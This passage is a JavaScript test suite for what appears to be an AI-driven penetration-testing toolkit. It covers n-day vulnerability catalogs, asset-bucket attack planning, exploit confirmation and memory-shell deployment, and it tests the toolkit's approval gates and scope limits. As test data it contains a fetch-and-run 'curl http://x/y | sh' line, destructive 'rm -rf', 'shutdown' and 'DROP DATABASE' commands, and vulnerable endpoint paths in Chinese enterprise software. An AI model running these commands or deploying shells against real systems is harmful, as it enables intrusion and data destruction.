    JSON.stringify(pick(['公开测绘语法 app="畅捷通-TPlus"'])) === JSON.stringify(['app:"畅捷通-TPlus"']),
    JSON.stringify(pick(['公开测绘语法 app="畅捷通-TPlus"'])))
  expect('测绘语法：全角冒号 + 中文说明尾巴也要能取到',
    (pick(['公开测绘语法：title=="欢迎使用Apusic应用服务器"（Apusic 默认欢迎页标题）'])[0] ?? '') === 'title:"欢迎使用Apusic应用服务器"',
    JSON.stringify(pick(['公开测绘语法：title=="欢迎使用Apusic应用服务器"（Apusic 默认欢迎页标题）'])))
  expect('测绘语法：Shodan 原生语法从 FOFA 查询计划中剔除',
    JSON.stringify(pick(['shodan-query: ecology_JSessionid'])) === JSON.stringify([]),
    JSON.stringify(pick(['shodan-query: ecology_JSessionid'])))
  expect('没有测绘语法就返回空，**不编查询**',
    pick(['/seeyon/ 前缀 + htmlofficeservlet 路由存在', '公开 POC 记录响应含 htmoffice operate']).length === 0,
    JSON.stringify(pick(['/seeyon/ 前缀 + htmlofficeservlet 路由存在'])))

  const withQuery = await catalogTool.execute({ entryId: 'chanjet-tplus-loginmanager-sqli' })
  expect('详情模式给出同类资产扩面查询（复用率交接点）',
    withQuery.ok && withQuery.text.includes('同类资产扩面') && withQuery.text.includes('app:"畅捷通-TPlus"'),
    withQuery.text)
  const withoutQuery = await catalogTool.execute({ entryId: 'seeyon-a8-htmlofficeservlet-arbitrary-file-write-rce' })
  expect('没记测绘语法的条目如实说"反查不了"，不编查询',
    withoutQuery.ok && withoutQuery.text.includes('没记测绘语法')
    && (withoutQuery.entry?.expansion ?? []).length === 0,
    JSON.stringify(withoutQuery.entry?.expansion))

  // 语料里有一批是**从 nuclei 模板批量导入**的（未经人工复核）。不标出来，
  // 模型会把它们和逐条复核过的条目同等对待——那是误导。这条钉住「如实标注」。
  const autoImported = await catalogTool.execute({ entryId: 'cnvd-2021-15824' })
  expect('批量导入的条目在详情里如实标注「未经人工复核」',
    autoImported.ok && autoImported.text.includes('批量导入，未经人工复核')
    && autoImported.entry?.importedFrom?.kind === 'nuclei-template',
    autoImported.text.slice(0, 300))
  const curated = await catalogTool.execute({ entryId: 'ruoyi-common-download-resource-file-read' })
  expect('人工写的条目不带「批量导入」标注（标注不能泛化）',
    curated.ok && !curated.text.includes('批量导入，未经人工复核')
    && curated.entry?.importedFrom === null)
}

{
  // 账本模式：覆盖缺口必须从**真实账本文件**读出来，而不是让模型手输关键词。
  const coverageTool = toolDefs.get('nday_coverage')
  const gapWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'coverage-gap-'))
  try {
    expect('既不给 keyword 也不给 workspace 时明确报错',
      (await coverageTool.execute({})).ok === false)
    expect('账本不存在时明确报错并指路',
      (await coverageTool.execute({ workspace: gapWorkspace })).error.includes('asset_search'))
    fs.writeFileSync(path.join(gapWorkspace, 'asset-inventory.json'), JSON.stringify({
      assets: [
        { target: 'http://a', title: '泛微协同办公OA', tech: ['Weaver E-cology'] },
        { target: 'http://b', title: '某国产中间件', tech: ['ZzzUnknownMiddleware'] },
      ],
    }))
    const gap = await coverageTool.execute({ workspace: gapWorkspace })
    expect('账本模式读出资产数并派生产品关键词',
      gap.ok && gap.mode === 'inventory' && gap.assets === 2 && gap.keywords.length >= 2,
      JSON.stringify(gap.keywords))
    expect('陌生中间件被归到「三层全空」并给出补库路径',
      gap.text.includes('三层全空') && gap.text.includes('zzzunknownmiddleware')
      && gap.text.includes('nday_learn'), gap.text)
    expect('已有语料的产品归到「已可筛」并列出命中条目',
      gap.text.includes('weaver') && gap.text.includes('命中：'), gap.text)
    // 单关键词模式不能被改坏
    const single = await coverageTool.execute({ keyword: 'tongweb' })
    expect('单关键词模式仍然可用', single.ok && single.text.includes('覆盖体检：tongweb'), single.text?.slice(0, 80))
  } finally {
    fs.rmSync(gapWorkspace, { recursive: true, force: true })
  }
}

{
  const draftTool = toolDefs.get('nday_draft')
  const out = await draftTool.execute({
    text: [
      'POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc',
      '6.2.1012.4',
      'https://example.com/kingdee-advisory',
    ].join('\n'),
    entryId: 'kingdee-draft-example',
    product: '金蝶 K3Cloud',
    vendor: '金蝶',
    vulnClass: '反序列化 RCE',
  })
  expect('nday_draft 生成草案', out.ok && out.draft.id === 'kingdee-draft-example', out.error)
  expect('草案固定为未复核状态', out.draft.status === 'legacy-unreviewed')
  expect('草案带上单段路径与 weak 探针',
    out.draft.fingerprint.paths.includes('/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc')
    && out.draft.fingerprint.probes[0].weight === 'weak')
  expect('草案来源可交给 nday_learn', out.draft.sources[0].url === 'https://example.com/kingdee-advisory')
  expect('草案文本写明不是漏洞结论', out.text.includes('不是漏洞结论'))
  const missingId = await draftTool.execute({ text: 'GET /a/b', sourceUrl: 'https://example.com/x' })
  expect('缺 entryId 时明确提示', missingId.ok && missingId.needsHuman.some((line) => line.includes('entryId')))
  const both = await draftTool.execute({ text: 'GET /a/b', documentPath: 'x.md' })
  expect('documentPath 与 text 不允许同时给', both.ok === false)
}

{
  const planTool = toolDefs.get('attack_plan')
  const planWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-plan-'))
  fs.writeFileSync(path.join(planWorkspace, 'asset-inventory.json'), JSON.stringify({
    schema: 'saker.asset-inventory/1',
    updatedAt: new Date().toISOString(),
    assets: [
      { id: 'a1', target: 'http://oa1.example.com', host: 'oa1.example.com', tech: ['weaver', 'ecology'], sources: ['test'] },
      { id: 'a2', target: 'http://oa2.example.com', host: 'oa2.example.com', tech: ['weaver', 'ecology'], sources: ['test'] },
      { id: 'a3', target: 'http://evil.example.net', host: 'evil.example.net', ip: '198.51.100.9', tech: ['weaver', 'ecology'], sources: ['stale-import'] },
    ],
  }, null, 2))
  fs.writeFileSync(path.join(planWorkspace, 'operation-state.json'), JSON.stringify({
    version: 1,
    goal: { text: 'fixture plan' },
    criteria: [],
    intents: [],
    scope: [],
  }, null, 2))
  const defaultPlan = await planTool.execute({ workspace: planWorkspace, scope: '*.example.com' })
  expect('attack_plan 默认不写入内部任务图', defaultPlan.ok && defaultPlan.graph.registered === 0
    && defaultPlan.assetsExcludedByScope === 1
    && JSON.parse(fs.readFileSync(path.join(planWorkspace, 'operation-state.json'), 'utf8')).intents.length === 0,
    JSON.stringify(defaultPlan.graph))
  const out = await planTool.execute({ workspace: planWorkspace, scope: '*.example.com', registerIntents: true })
  expect('attack_plan 生成可执行桶', out.ok && out.plan.buckets.some((bucket) => bucket.entryId === 'weaver-ecology-dubboapi-debug-rce'), out.error)
  expect('attack_plan 覆盖两个同指纹资产',
    out.plan.buckets.find((bucket) => bucket.entryId === 'weaver-ecology-dubboapi-debug-rce')?.assetIds.length === 2
    && out.assetsExcludedByScope === 1)
  expect('attack_plan 落盘机读与人读计划',
    fs.existsSync(path.join(planWorkspace, 'fingerprint-buckets.json')) && fs.existsSync(path.join(planWorkspace, 'attack-plan.md')))
  expect('attack_plan 把桶登记成可追踪任务',
    out.graph.registered >= 1
    && JSON.parse(fs.readFileSync(path.join(planWorkspace, 'operation-state.json'), 'utf8')).intents.some((intent) => intent.bucketId === 'bucket-weaver-ecology-dubboapi-debug-rce'),
    JSON.stringify(out.graph))
  // 下一跳的收窄引导：不带 entryIds 全量跑会撞上单次 800 次探测的上限，
  // 与其让模型撞墙再回读报错，不如在计划输出里就把「按桶跑」写清楚。
  expect('attack_plan 给出下一跳的收窄引导（按桶跑 nday_match，别全量）',
    out.text.includes('entryIds=<该组 entryId>') && out.text.includes('800'), out.text.slice(-260))
  const gate = toolDefs.get('attack_gate')
  const bucketId = out.plan.buckets.find((bucket) => bucket.entryId === 'weaver-ecology-dubboapi-debug-rce').bucketId
  const pending = await gate.execute({ action: 'status', workspace: planWorkspace })
  const pendingGate = pending.gates.find((item) => item.bucketId === bucketId)
  expect('attack_gate 初始要求先验证代表资产',
    pending.ok && pendingGate.spreadAllowed === false && pendingGate.nextAction === 'verify-representative')
  const wrongAsset = await gate.execute({ action: 'record', workspace: planWorkspace, bucketId, assetId: 'a2', outcome: 'confirmed', evidence: 'x' })
  expect('非代表资产不能解锁整组', wrongAsset.ok === false && wrongAsset.error.includes('代表资产'))
  const noEvidence = await gate.execute({ action: 'record', workspace: planWorkspace, bucketId, assetId: 'a1', outcome: 'confirmed' })
  expect('确认缺证据被拒', noEvidence.ok === false && noEvidence.error.includes('evidence'))
  const confirmed = await gate.execute({ action: 'record', workspace: planWorkspace, bucketId, assetId: 'a1', outcome: 'confirmed', evidence: 'req-1 / resp-1' })
  const confirmedGate = confirmed.gates.find((item) => item.bucketId === bucketId)
  expect('代表资产确认后才解锁铺开',
    confirmed.ok && confirmedGate.spreadAllowed === true && fs.existsSync(path.join(planWorkspace, 'attack-progress.json')))
  fs.rmSync(planWorkspace, { recursive: true, force: true })
}

{
  const zday = toolDefs.get('zday_pattern')
  const refund = await zday.execute({ surface: '退款 并发 幂等键 重复请求' })
  expect('zday_pattern 匹配退款/幂等模式',
    refund.ok && refund.patterns.some((p) => p.id === 'refund-double-spend' || p.id === 'idempotency-race'),
    JSON.stringify(refund.patterns?.map((p) => p.id)))
  expect('zday_pattern 强制输出先行证伪与最小验证',
    refund.text.includes('先想什么会推翻') && refund.text.includes('最小验证') && refund.text.includes('不是漏洞发现'))
  const oauth = await zday.execute({ surface: 'OAuth 回调 state redirect_uri' })
  expect('zday_pattern OAuth 面优先命中 OAuth 模式',
    oauth.ok && oauth.patterns[0]?.id === 'oauth-state-redirect',
    JSON.stringify(oauth.patterns?.map((p) => p.id)))
  const unknown = await zday.execute({ surface: 'zzzz-no-such-surface' })
  expect('无精确命中时明确标记 exact=false 并给通用切入点',
    unknown.ok && unknown.exact === false && unknown.patterns.length > 0)
}

{
  const access = toolDefs.get('access_confirm')
  const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'access-confirm-'))
  fs.writeFileSync(path.join(ws, 'operation-state.json'), JSON.stringify({ criteria: [], intents: [] }))
  const rce = await access.execute({
    entryId: 'tongtech-tongweb-ejb-deserialization',
    asset: 'http://127.0.0.1:18080',
    workspace: ws,
  })
  expect('access_confirm 为反序列化/RCE 生成只读确认阶梯',
    rce.ok && rce.plan.primitive === 'deserialization'
    && rce.text.includes('DNSLog') && rce.text.includes('必须明确批准'),
    JSON.stringify(rce.plan))
  const commandPlan = buildAccessPlan({
    id: 'demo-rce',
    product: 'Demo RCE',
    vulnClass: '未认证命令执行 RCE',
    status: 'normalized',
    verify: { oob: ['dnslog'] },
    exploit: { primitives: ['命令执行'] },
  }, 'http://127.0.0.1:18082')
  const commandText = renderAccessPlan(commandPlan)
  expect('access_confirm 对 RCE 只允许 whoami 级只读命令',
    commandPlan.primitive === 'rce'
    && commandText.includes('whoami') && commandText.includes('除只读身份命令外'),
    JSON.stringify(commandPlan))
  expect('access_confirm 阻止内存马持久化',
    rce.plan.memoryShell.status === 'blocked' && rce.plan.memoryShell.reason.includes('自建'))
  const selfHosted = buildAccessPlan({
    id: 'demo-rce',
    product: 'Demo RCE',
    vulnClass: '未认证命令执行 RCE',
    status: 'normalized',
    verify: { oob: ['dnslog'] },
    exploit: { primitives: ['命令执行'] },
  }, 'http://127.0.0.1:18082', { memoryBackend: { enabled: true, backendUrl: 'http://127.0.0.1:8080' } })
  expect('自建 backend 就绪后内存马进入待批准而非直接禁止',
    selfHosted.memoryShell.status === 'ready-for-approval'
    && renderAccessPlan(selfHosted).includes('部署仍需明确批准')
    && selfHosted.memoryShell.commands.some((command) => command === 'memparty --api http://127.0.0.1:8080 version')
    && !selfHosted.memoryShell.commands.some((command) => command.includes('party.mem.mk')))
  const publicBackend = classifyMemoryBackend({ enabled: true, backendUrl: 'https://party.mem.mk' })
  expect('公共 memshell 后端永远拒绝', publicBackend.ready === false && publicBackend.reason.includes('公共'))
  const cliPlan = buildMemshellCliPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080', cliPath: 'memparty' }, { command: 'version', args: [] })
  expect('memparty 计划固定带自建 --api',
    cliPlan.ok && cliPlan.plan.argv[0] === '--api' && cliPlan.plan.argv[1] === 'http://127.0.0.1:8080')
  const riskyPlan = buildMemshellCliPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080' }, { command: 'gen', args: ['-s', 'Tomcat'] })
  expect('生成/部署类命令标记为待审批', riskyPlan.ok && riskyPlan.plan.approvalRequired === true)
  const sensitivePlan = buildMemshellCliPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080' }, {
    command: 'gen',
    args: ['-s', 'Tomcat', '--godzilla-pass', 'Passw0rd!', '--godzilla-key', 'SecretKey'],
  })
  expect('口令/密钥从命令展示中脱敏',
    sensitivePlan.ok && sensitivePlan.plan.argvPreview.includes('<redacted>')
    && !sensitivePlan.plan.commandLine.includes('Passw0rd!') && !sensitivePlan.plan.commandLine.includes('SecretKey')
    && sensitivePlan.plan.approvalPhrase.startsWith('APPROVE-'))
  expect('计划拒绝覆盖 --api',
    buildMemshellCliPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080' }, { command: 'version', args: ['--api', 'https://party.mem.mk'] }).ok === false)
  const cliRun = executeMemshellCliPlan(cliPlan.plan, { runner: () => ({ status: 0, stdout: 'memparty 1.0', stderr: '' }) })
  expect('计划执行器捕获输出与退出码', cliRun.ok && cliRun.exitCode === 0 && cliRun.stdout.includes('memparty'))
  const mcpPlan = buildMemshellMcpPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080', mcpServer: 'memshell-party' }, {
    mcpTool: 'generate_memshell',
    mcpArgs: { server: 'Tomcat', password: 'SecretPass' },
  })
  expect('MCP plan 固定 server/tool 并生成一次性令牌',
    mcpPlan.ok && mcpPlan.plan.name === 'mcp__memshell-party__generate_memshell'
    && mcpPlan.plan.argsPreview.password === '<redacted>' && mcpPlan.plan.approvalToken.length >= 16)

  // 载荷/参数级审批：原来审批只按子命令分档，`exec whoami` 与 `exec rm -rf /`
  // 拿到的是同一句批准短语。规则写在 persona 里（删除类严禁执行），执行器却照批不误。
  expect('只读 exec 被判为 read-only-exec',
    classifyActionImpact('exec', ['--cmd', 'whoami']).tier === 'read-only-exec')
  expect('非白名单 exec 被判为 state-changing-exec 并给出限制说明',
    classifyActionImpact('exec', ['--cmd', 'curl http://x/y | sh']).tier === 'state-changing-exec'
    && classifyActionImpact('exec', ['--cmd', 'curl http://x/y | sh']).reason.includes('只读白名单'))
  for (const [label, argv] of [
    ['rm -rf', ['--cmd', 'rm -rf /tmp/x']],
    ['Windows del', ['--cmd', 'del /f /q C:\\\\x\\\\y']],
    ['关机', ['--cmd', 'shutdown /r /t 0']],
    ['删库', ['--sql', 'DROP DATABASE app']],
    ['删表', ['--sql', 'DELETE FROM users']],
  ]) {
    const impact = classifyActionImpact('exec', argv)
    expect(`破坏性动作被拦（${label}）`, impact.blocked === true && impact.tier === 'destructive', JSON.stringify(impact))
  }
  expect('破坏性 exec 计划在计划阶段就被拒绝',
    buildMemshellCliPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080' }, {
      command: 'exec', args: ['--cmd', 'rm -rf /var/www'],
    }).ok === false)
  const readOnlyExecPlan = buildMemshellCliPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080' }, {
    command: 'exec', args: ['--cmd', 'whoami'],
  })
  expect('只读 exec 计划带影响档与限制说明',
    readOnlyExecPlan.ok && readOnlyExecPlan.plan.payloadReview.impact === 'read-only-exec'
    && typeof readOnlyExecPlan.plan.payloadReview.limits === 'string'
    && readOnlyExecPlan.plan.payloadReview.limits.length > 0)
  expect('写入类动作标为 write 并要求记录落地与清理',
    buildMemshellCliPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080' }, {
      command: 'upload', args: ['--target', 'http://t/x'],
    }).plan.payloadReview.impact === 'write')
  expect('破坏性 MCP 调用同样被拒绝',
    buildMemshellMcpPlan({ enabled: true, backendUrl: 'http://127.0.0.1:8080', mcpServer: 'memshell-party' }, {
      mcpTool: 'exec_command', mcpArgs: { command: 'rm -rf /srv' },
    }).ok === false)
  expect('MCP 计划也带影响档',
    mcpPlan.ok && mcpPlan.plan.payloadReview.impact === 'payload-generation'
    && typeof mcpPlan.plan.payloadReview.limits === 'string')

  const upload = await access.execute({
    entryId: 'seeyon-oa-ajaxdo-file-upload',
    asset: 'http://127.0.0.1:18081',
    workspace: ws,
  })
  expect('access_confirm 对上传条目要求批准与清理',
    upload.ok && upload.plan.primitive === 'file-write'
    && upload.plan.approvalRequiredFor.some((line) => line.includes('上传'))
    && upload.plan.cleanup.includes('删除'))
  expect('access_confirm 落盘计划', fs.existsSync(path.join(ws, rce.files.json)) && fs.existsSync(path.join(ws, rce.files.markdown)))
  settingsState.value = { memshell: { enabled: true, backendUrl: 'http://127.0.0.1:8080', cliPath: 'memshell-party-cli' } }
  const configured = await access.execute({
    entryId: 'tongtech-tongweb-ejb-deserialization',
    asset: 'http://127.0.0.1:18080',
    workspace: ws,
  })
  expect('access_confirm 真实读取 sec-config 自建 backend',
    configured.ok && configured.plan.memoryShell.status === 'ready-for-approval'
    && configured.text.includes('自建后端已就绪'))
  const memTool = toolDefs.get('memshell_cli')
  const memStatus = await memTool.execute({ action: 'status' })
  expect('memshell_cli status 读取自建 backend', memStatus.ok && memStatus.ready === true)
  const memPlan = await memTool.execute({ action: 'plan', workspace: ws, command: 'version', args: [] })
  expect('memshell_cli plan 落盘非执行计划',
    memPlan.ok && fs.existsSync(path.join(ws, memPlan.file)) && memPlan.plan.commandLine.includes('--api http://127.0.0.1:8080'))
  const risky = await memTool.execute({ action: 'plan', workspace: ws, command: 'gen', args: ['-s', 'Tomcat'] })
  const noApproval = await memTool.execute({ action: 'run', workspace: ws, planId: risky.plan.planId, note: '未给批准短语' })
  expect('高风险 plan 缺批准短语时拒绝执行', noApproval.ok === false && noApproval.error.includes('批准短语'))
  // 工具面同样受参数级判据约束：破坏性命令连计划都建不出来，更谈不上批准后执行。
  const destructivePlan = await memTool.execute({
    action: 'plan', workspace: ws, command: 'exec', args: ['--cmd', 'rm -rf /var/www'],
  })
  expect('工具面拒绝破坏性 exec 计划',
    destructivePlan.ok === false && destructivePlan.error.includes('破坏性动作'))
  const readOnlyPlanTool = await memTool.execute({
    action: 'plan', workspace: ws, command: 'exec', args: ['--cmd', 'whoami'],
  })
  expect('工具面为只读 exec 标出影响档',
    readOnlyPlanTool.ok && readOnlyPlanTool.plan.payloadReview.impact === 'read-only-exec')
  const memRun = await memTool.execute({ action: 'run', workspace: ws, planId: memPlan.plan.planId, note: '用户已明确批准' })
  expect('memshell_cli run 落审计（即使本机未安装 memparty）',
    memRun.result && memRun.result.planId === memPlan.plan.planId && fs.existsSync(path.join(ws, memRun.file)))

  // 端到端演练（本地 fixture，不打任何真实目标）：换上一个**真能跑起来**的桩 CLI，
  // 把「plan → 宿主审批 → 真子进程执行 → 落审计」整条链走通。
  // 上面那条只覆盖到「CLI 不存在时也要落审计」，成功路径此前没人走过。
  {
    const stubDir = fs.mkdtempSync(path.join(os.tmpdir(), 'memparty-stub-'))
    const isWin = process.platform === 'win32'
    const stub = path.join(stubDir, isWin ? 'memparty.cmd' : 'memparty.sh')
    fs.writeFileSync(stub, isWin
      ? '@echo off\r\necho MEMPARTY-STUB %*\r\nexit /b 0\r\n'
      : '#!/bin/sh\necho "MEMPARTY-STUB $*"\nexit 0\n')
    if (!isWin) fs.chmodSync(stub, 0o755)

    settingsState.value = {
      memshell: { enabled: true, backendUrl: 'http://127.0.0.1:8080', cliPath: stub },
    }
    const drillPlan = await memTool.execute({
      action: 'plan', workspace: ws, command: 'exec', args: ['--cmd', 'whoami'],
    })
    expect('演练：只读 exec 计划生成（固定自建 --api）',
      drillPlan.ok
      && drillPlan.plan.commandLine.includes('--api http://127.0.0.1:8080')
      && drillPlan.plan.commandLine.includes('whoami')
      && drillPlan.plan.approvalRequired === true)
    // 回给模型的公开计划里不该出现原始 argv / args / 审批令牌（只有落盘那份才有）。
    expect('演练：公开计划不回原始 argv/args/令牌',
      drillPlan.plan.argv === undefined && drillPlan.plan.args === undefined
      && drillPlan.plan.approvalToken === undefined)
    const noApprove = await memTool.execute({
      action: 'run', workspace: ws, planId: drillPlan.plan.planId, note: '没给短语',
    })
    expect('演练：缺批准短语时不执行', noApprove.ok === false)
    const drillRun = await memTool.execute({
      action: 'run', workspace: ws, planId: drillPlan.plan.planId,
      note: '用户已明确批准', approval: drillPlan.plan.approvalPhrase,
    })
    expect('演练：真子进程执行成功并捕获输出',
      drillRun.ok === true && drillRun.result.exitCode === 0
      && String(drillRun.result.stdout).includes('MEMPARTY-STUB')
      && String(drillRun.result.stdout).includes('--api http://127.0.0.1:8080')
      && String(drillRun.result.stdout).includes('whoami'), JSON.stringify(drillRun.result))
    const audit = JSON.parse(fs.readFileSync(path.join(ws, drillRun.file), 'utf8'))
    // 审计是**平铺**的（result 直接 spread 进审计对象），不是嵌一层 result。
    expect('演练：审计记录退出码、命令行、耗时与后端归属',
      audit.schema === 'saker.memshell-cli-run/1' && audit.planId === drillPlan.plan.planId
      && audit.exitCode === 0 && typeof audit.commandLine === 'string'
      && typeof audit.startedAt === 'string' && typeof audit.finishedAt === 'string'
      && audit.backendHost === '127.0.0.1' && audit.note === '用户已明确批准'
      && Array.isArray(audit.argvPreview),
      JSON.stringify(audit).slice(0, 200))
    fs.rmSync(stubDir, { recursive: true, force: true })
  }

  const mcpPlanTool = await memTool.execute({
    action: 'plan', workspace: ws, transport: 'mcp', mcpTool: 'generate_memshell',
    mcpArgs: { server: 'Tomcat', password: 'SecretPass' },
  })
  expect('memshell_cli MCP plan 不把原始参数/令牌回给模型',
    mcpPlanTool.ok && mcpPlanTool.plan.name === 'mcp__memshell-party__generate_memshell'
    && mcpPlanTool.plan.args === undefined && mcpPlanTool.plan.approvalToken === undefined
    && fs.existsSync(path.join(ws, mcpPlanTool.file)))
  const mcpRun = await memTool.execute({
    action: 'run', workspace: ws, planId: mcpPlanTool.plan.planId, note: '用户已明确批准',
    approval: mcpPlanTool.plan.approvalPhrase,
  })
  expect('memshell_cli MCP run 经 tools.execute 且带审批令牌',
    mcpRun.ok === true && mcpCalls.length === 1
    && mcpCalls[0].name === 'mcp__memshell-party__generate_memshell'
    && mcpCalls[0].arguments.__sakerMemshellApprovalToken
    && fs.existsSync(path.join(ws, mcpRun.file)))
  settingsState.value = undefined

  const taskWs = fs.mkdtempSync(path.join(os.tmpdir(), 'access-task-'))
  fs.writeFileSync(path.join(taskWs, 'operation-state.json'), JSON.stringify({ criteria: [], intents: [] }))
  const linked = await access.execute({
    entryId: 'weaver-ecology-dubboapi-debug-rce',
    asset: 'http://127.0.0.1:18082',
    workspace: taskWs,
    bucketId: 'bucket-weaver-ecology-dubboapi-debug-rce',
    parentTaskId: 'i1',
  })
  const taskState = JSON.parse(fs.readFileSync(path.join(taskWs, 'operation-state.json'), 'utf8'))
  expect('access_confirm 可把确认步骤挂到父任务图',
    linked.ok && linked.task.registered && taskState.intents.some((intent) => intent.parentTaskId === 'i1' && intent.stage === 'S5'))
  fs.rmSync(ws, { recursive: true, force: true })
  fs.rmSync(taskWs, { recursive: true, force: true })
}

/** 一个"长得像 TongWeb"的靶机：/ejbserver/ejb 非 404、/console/ 非 404、首页带品牌串。 */
function startLookalike() {
  return http.createServer((req, res) => {
    const path = new URL(req.url ?? '/', 'http://x').pathname
    if (path.startsWith('/ejbserver/ejb')) { res.writeHead(500); res.end('EJB'); return }
    if (path.startsWith('/console/')) { res.writeHead(200); res.end('<html>TongWeb Console</html>'); return }
    if (path === '/') { res.writeHead(200, { 'content-type': 'text/html' }); res.end('<title>TongWeb</title>'); return }
    // 关键：未知路径必须 404。这里以前是「200 + 通用页」（软 404），
    // 于是「路径存在性」判据对任何路径都成立——那正是本轮修掉的假命中形态。
    res.writeHead(404, { 'content-type': 'text/plain' }); res.end('not found')
  })
}
/** 一个**软 404**站点：所有路径都 200 + 同一张通用页（SPA / 统一错误页 / WAF 挑战页）。 */
function startSoft404() {
  return http.createServer((_req, res) => {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    res.end('<!doctype html><html><title>Welcome</title><body>Please login to continue</body></html>')
  })
}
/** 一个**只认 vhost**的站点：Host 不匹配一律 404（护网里「IP + 域名」的常见形态）。 */
function startVhost() {
  return http.createServer((req, res) => {
    const host = String(req.headers.host || '')
    const path = new URL(req.url ?? '/', 'http://x').pathname
    if (host.startsWith('vhost.test')) {
      if (path === '/') { res.writeHead(200, { 'content-type': 'text/html' }); res.end('<title>TongWeb</title>'); return }
      if (path.startsWith('/console/')) { res.writeHead(200); res.end('<html>TongWeb Console</html>'); return }
      if (path.startsWith('/ejbserver/ejb')) { res.writeHead(500); res.end('EJB'); return }
    }
    res.writeHead(404, { 'content-type': 'text/plain' }); res.end('not found')
  })
}
/** 一个 **SPA** 站点：任何路径都返回同一张带产品标题的页（nginx try_files 兜底）。 */
function startSpa() {
  return http.createServer((_req, res) => {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    res.end('<!doctype html><html><head><title>AJ-Report</title></head><body><div id="app"></div></body></html>')
  })
}
/** 一个什么都 404 的普通站点。 */
function startPlain() {
  return http.createServer((_req, res) => { res.writeHead(404); res.end('not found') })
}
/** 一个暴露了泛微 /papi debug 路径的站点（其余 404）。 */
function startEcology() {
  return http.createServer((req, res) => {
    if (req.url.startsWith('/papi/esearch/data/devops/dubboApi/debug/method')) {
      res.writeHead(req.method === 'POST' ? 500 : 405, { 'content-type': 'text/plain' })
      res.end('error'); return
    }
    res.writeHead(404); res.end('not found')
  })
}
/** 一个"走了致远易受攻击分支"的站点：ajax.do 路径回显空指针签名。 */
function startSeeyon() {
  return http.createServer((req, res) => {
    if (req.url.includes('/seeyon/thirdpartyController.do.css')) {
      res.writeHead(500, { 'content-type': 'text/plain' })
      res.end('java.lang.NullPointerException:null'); return
    }
    if (req.url.startsWith('/seeyon/')) { res.writeHead(200); res.end('login'); return }
    res.writeHead(404); res.end('not found')
  })
}
/** 一个暴露金蝶 kdsvc 服务门面的站点。 */
function startKingdee() {
  return http.createServer((req, res) => {
    if (req.url.includes('Kingdee.BOS.ServiceFacade')) {
      res.writeHead(req.method === 'POST' ? 500 : 405, { 'content-type': 'text/plain' })
      res.end('error'); return
    }
    res.writeHead(404); res.end('not found')
  })
}

const listen = (server) => new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(server.address().port)))
const close = (server) => new Promise((resolve) => server.close(resolve))

const look = startLookalike()
const plain = startPlain()
const ecology = startEcology()
const seeyon = startSeeyon()
const kingdee = startKingdee()
const lookPort = await listen(look)
const plainPort = await listen(plain)
const ecologyPort = await listen(ecology)
const seeyonPort = await listen(seeyon)
const kingdeePort = await listen(kingdee)
const workspace = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-hunter-'))

try {
  const matchTool = toolDefs.get('nday_match')
  {
    let requestCount = 0
    const guardedTarget = http.createServer((_req, res) => {
      requestCount += 1
      res.writeHead(200)
      res.end('must not be probed')
    })
    const guardedPort = await listen(guardedTarget)
    try {
      const outOfScope = await matchTool.execute({
        targets: `http://127.0.0.1:${guardedPort}`,
        scope: 'example.com',
        workspace,
        entryIds: 'tongtech-tongweb-ejb-deserialization',
      })
      expect('裸域范围不会主动探测其子域或其他主机',
        outOfScope.ok === false && outOfScope.error.includes('精确范围') && requestCount === 0,
        JSON.stringify({ error: outOfScope.error, requestCount }))
    } finally {
      await close(guardedTarget)
    }
  }
  {
    const scopeHunt = toolDefs.get('nday_scope_hunt')
    const noScope = await scopeHunt.execute({ workspace })
    expect('FOFA Nday 搜索缺少 scope 时在调用 API 前拒绝', noScope.ok === false && noScope.error.includes('scope'))

    const catalog = readCatalog(resolveSakerRoot())
    const candidatePlan = buildNdaySearchPlan(catalog, { focus: 'rce', limit: 100 })
    const mappedEntryId = candidatePlan.selected.flatMap((group) => group.entryIds)
      .find((id) => probePlan(catalog.entries.find((entry) => entry.id === id), 'http://fixture').length > 0)
    const mappedEntry = catalog.entries.find((entry) => entry.id === mappedEntryId)
    const singleEntryPlan = buildNdaySearchPlan(catalog, { focus: 'rce', entryIds: mappedEntryId, limit: 100 })
    const localCandidate = {
      target: `http://127.0.0.1:${lookPort}`,
      host: '127.0.0.1', domain: '127.0.0.1', ip: '127.0.0.1',
      port: String(lookPort), protocol: 'http', title: 'local authorized fixture',
    }
    const batchCalls = []
    ndayBatchSearchHandler = async (args) => {
      batchCalls.push(args)
      return {
        ok: true,
        estimatedRequests: args.queries.length,
        queryResults: args.queries.map((query, index) => ({
          id: query.id, query: query.query, ok: true,
          assets: index === 0 ? [localCandidate] : [],
          platformErrors: [],
        })),
      }
    }
    try {
      const dispatchOffset = mcpCalls.length
      const outerCallId = 'nday-scope-hunt-test'
      const outerToken = Symbol('nday-test-parent')
      const outerSignal = new AbortController().signal
      const hunted = await scopeHunt.execute({
        scope: '127.0.0.1', workspace, entryIds: mappedEntryId, limit: 1,
      }, {
        callId: outerCallId, rootCallId: outerCallId, token: outerToken, signal: outerSignal,
      })
      const nestedDispatch = mcpCalls.slice(dispatchOffset).find((request) => request.name === 'asset_search_batch')
      expect('范围搜索真实调用批量 FOFA 工具并保存 searchId',
        hunted.ok && hunted.searchId && hunted.candidateCount === 1 && batchCalls.length === 1
        && batchCalls[0].platform === 'fofa' && batchCalls[0].scope === '127.0.0.1'
        && !Object.hasOwn(batchCalls[0], 'size')
        && batchCalls[0].queries[0].entryIds.includes(mappedEntryId)
        && ['catalog-fingerprint', 'probe-signature', 'port-refinement', 'product-alias'].includes(batchCalls[0].queries[0].basis),
